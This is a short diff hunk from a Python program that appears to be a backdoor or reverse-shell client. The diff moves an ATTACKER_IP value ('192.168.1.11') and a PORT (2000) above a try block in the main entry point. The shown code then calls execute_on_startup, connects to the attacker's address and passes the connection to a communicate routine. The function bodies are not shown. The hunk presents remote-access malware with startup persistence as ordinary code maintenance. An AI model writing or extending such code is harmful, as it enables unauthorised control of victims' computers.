@@ -190,10 +190,10 @@ def communicate(connection):
 
 
 if __name__ == "__main__":
+    ATTACKER_IP = "192.168.1.11"
+    PORT = 2000
+    
     try:
-        ATTACKER_IP = "192.168.1.11"
-        PORT = 2000
-
         execute_on_startup()
         connection = establish_connection(ATTACKER_IP, PORT)
         communicate(connection)
